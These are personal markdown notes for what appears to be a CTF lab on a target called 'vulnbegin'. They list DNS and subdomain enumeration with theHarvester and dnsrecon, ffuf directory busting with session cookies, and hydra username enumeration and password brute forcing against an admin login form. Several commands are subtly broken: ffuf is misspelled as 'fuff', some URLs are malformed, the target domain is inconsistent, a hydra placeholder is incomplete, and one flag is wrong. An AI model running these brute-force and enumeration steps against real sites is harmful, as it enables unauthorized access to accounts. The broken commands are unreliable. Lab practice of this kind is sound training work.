
>[!warning]
> CTFChallenge will ban you if you use aggresive bruteforce or scanning.
# Step 1 : 
## Check Code

>[!Note] 
>- Comments
>- Avoid Prebuild Frameworks

__________________________

# Step 2 : 
## DNS Information

```Powershell
nslookup -type=any vulnbegin.com 8.8.8.8
```
_________________

# Step 3 : 
## Subdomain Find

**`Tools can be used like sublister, assetfinder, etc.`**

>[!Info] OSINT WAY
```bash
theHarvester -d vulnbegin.co -b all
```

>[!info] Bruteforce way 
>
```bash
dnsrecon -d vulnbegin.co.uk -D /wordlists/subdomain.txt -type brt
```

### curl

curl *.vulnbegin.co -H "Cookie: $cookie"
_____________

# Step 4 :
## Content Discovery
#Directory_Busting

```bash
fuff -w /wordlists/content.txt -t 2 -p 0.1 -H "Cookie: $cookie" -u http:/vulnbegin.co/FUZZ
```

_________

# Step 5 :
## User Enumeration

```bash
hydra -L /wordlists/usernames.txt -p abcd vulnbegin.co http-post-form "/cpadmin/login:username=^USER^&password=^PASS:F=Username is Invalid:H=Cookie: $cookie" -f -t 1
```

## Password Bruteforce

```bash
hydra -l admin -p /wordlists/password.txt vulnbegin.co http-post-form "/cpadmin/login:username=^USER^&password=^PASS:F=Password is Invalid:H=Cookie: $cookie" -f -t 1
```

_____
# Step 6 : 
## Cookies
Name | Value
---- | ----
token| @@@@
ctfchallenge | @@@@

>[!Note]
>Token allows us to stay on the user page.

```bash
fuff -w /wordlists/content.txt -t 2 -p 0.1 -H "Cookie: token=@@@@; $cookie" -u http:/vulnbegin.co/userpage/FUZZ
```

________

# Step 7 :
## Find the commons

- Use the header to other subdomain
__________
# Step 8 :
## Content Discovery

```bash
fuff -w /wordlists/content.txt -t 2 -p 0.1 -H "Header dicovered" -H "Cookie: $cookie" -u http://*.vulnbegin.co/FUZZ
```
______
# Step 9 :
## User Bruteforce 
#using_seq_tool

```bash
seq 1 100 | fuff -w - -t 2 -p 0.1 -H "Header dicovered" -H "Cookie: $cookie" -u http://*.vulnbegin.co/user/FUZZ
```
